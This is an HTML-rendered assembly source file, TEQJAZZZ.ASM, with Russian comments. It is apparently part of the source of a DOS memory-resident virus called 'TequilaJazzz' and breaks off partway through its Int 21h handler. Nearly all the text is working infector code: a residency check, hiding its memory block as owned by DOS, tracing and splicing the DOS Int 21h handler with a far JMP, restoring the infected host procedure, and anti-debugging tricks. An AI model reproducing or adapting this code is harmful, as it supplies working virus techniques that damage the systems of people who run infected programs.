<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>TEQJAZZZ.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">TeqJazDemo</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'TJiw'</span><span class="sc0">
</span><span class="sc5">TeqJazInfo</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'TInf'</span><span class="sc0">
</span><span class="sc5">TequilaJiD</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'TeqJ'</span><span class="sc0">
</span><span class="sc5">AnswerID</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'JaZz'</span><span class="sc0">
</span><span class="sc5">MCBSign</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OwnerAddress</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">LenOfBLOK</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">TrF</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">GARBLELen</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">MinPRCLen</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">130</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────</span><span class="sc0">


        </span><span class="sc2">.486</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
</span><span class="sc5">TeqJazzz</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">TeqJazzz</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">TeqJazzz</span><span class="sc0">

</span><span class="sc5">TequilaJazzz</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TequilaBase</span><span class="sc0">
</span><span class="sc5">TequilaBase</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TequilaJazzz</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">TeqBASE</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
                       </span><span class="sc1">; Тест процессора</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">              </span><span class="sc1">; i286  : 15 бит FLAGS = 1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; i386+ : 15 бит EFLAGS = 0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Its386</span><span class="sc4">&amp;</span><span class="sc5">Higher</span><span class="sc0">  </span><span class="sc1">; Ниже тройки не пойдет</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">               </span><span class="sc1">; NOP вместо 66h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">PopAll</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">PopFlag</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitTequilaJaz</span><span class="sc0">

</span><span class="sc5">Its386</span><span class="sc4">&amp;</span><span class="sc5">Higher</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">         </span><span class="sc1">; Сохраним все 32 разрядные регистры</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">TeqBASE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FF55h</span><span class="sc0">     </span><span class="sc1">; Присутствуем в памяти ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">TequilaJiD</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Generation</span><span class="sc0">   </span><span class="sc1">; Ссылка на поколение</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">AnswerID</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitTequilaJaz</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ParaLenWSP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Освободим себе места</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReAllocateMEM</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; Выделяем себе блок</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ExitTequilaJaz</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OwnerAddress</span><span class="sc4">],</span><span class="sc2">8h</span><span class="sc0">   </span><span class="sc1">; Я круче DOS !</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">         </span><span class="sc1">; Переезжаем...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">LenPreparePart</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Сам вирус и</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">TequilaLen</span><span class="sc0">       </span><span class="sc1">; часть затертой процедуры</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">        </span><span class="sc1">; Все свое ношу с собой</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">Continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">; Перехватим Int 21h : Извращаться особо не будем</span><span class="sc0">
</span><span class="sc1">; Протрассируем Int 21h - через Int 1 получим оригинальный Int 21h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Табличный Int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RealInt21</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Work</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TestDOS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TraceDOS</span><span class="sc0">     </span><span class="sc1">; А мы тут плюшками балуемся ...</span><span class="sc0">

</span><span class="sc1">; Делаем сплайсинг в DOS</span><span class="sc0">
</span><span class="sc1">; стандартным JMP'ом в вирус</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Work</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RestoreJump</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DOSbytes</span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldDOSbytes</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TeqJazInt21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldDOSbytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExchangeDOS</span><span class="sc0">

</span><span class="sc1">; Переустановим адрес родительского процесса в PSP на себя</span><span class="sc0">
</span><span class="sc1">; для последующего переезда вниз</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ParentAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Parental Address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveToLowMEM</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">ExitTequilaJaz</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ProcAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Адрес зараженной процедуры</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ReturnToPROC</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">; Для выхода</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ReturnToPROC</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">LenPreparePart</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">TequilaLen</span><span class="sc0">
                      </span><span class="sc1">; Восстанавливаем процедуру</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">; Восстановим выход из процедуры</span><span class="sc0">
</span><span class="sc1">; Процедура была полностью замаскирована : затерт и выход и вход</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">ExitPROC</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">OldBytes</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Байты выхода из процедуры -</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; POP BP,RETF/RETN</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Пошлем их со своим конвейером...</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">; Восстанавливаем Все регистры</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">PopAll</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">PopFlag</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">   </span><span class="sc1">; Jmp far PROC</span><span class="sc0">
</span><span class="sc5">ReturnToPROC</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TequilaJazzz</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;───────────────────</span><span class="sc0">
</span><span class="sc5">MoveToLowMEM</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; Делаем новый внизу</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ParaLenWSP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">GotoParent</span><span class="sc0">  </span><span class="sc1">; Обломаемся мы с переездом...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OwnerAddress</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; Владелец блока DOS.</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">        </span><span class="sc1">; Снова на новую квартиру</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">TequilaLen</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">RealInt21</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TeqJazInt21</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">JmpIsHeRe</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExchangeDOS</span><span class="sc0">  </span><span class="sc1">; Новый сегмент обработчика</span><span class="sc0">
</span><span class="sc5">JmpIsHeRe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldDOSbytes</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExchangeDOS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Освобождаем этот блок</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DOS</span><span class="sc0">
</span><span class="sc5">GotoParent</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">ParentAddress</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MoveToLowMEM</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;──────────────────────────</span><span class="sc0">
</span><span class="sc5">TeqJazInt21</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Проверка на трассировку</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">    </span><span class="sc1">; Отвали козел...</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">      </span><span class="sc1">; Это если в трассировщике использован</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0"> </span><span class="sc1">; такой же прием как и у нас</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">      </span><span class="sc1">; (сбрасывание TF при pushf)</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; TF is ON!</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitTeqInt21</span><span class="sc0">    </span><span class="sc1">; Отвали козел...</span><span class="sc0">

</span><span class="sc1">;────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Это мы тут настырно лезем ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FF55h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Farther</span><span class="sc0">     </span><span class="sc1">; Дальше...</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">TequilaJiD</span><span class="sc0">  </span><span class="sc1">; Идентификация ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">TeqIdentify</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; SI - база</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Generation</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; BX - смещение Generation с SI=0</span><span class="sc0">
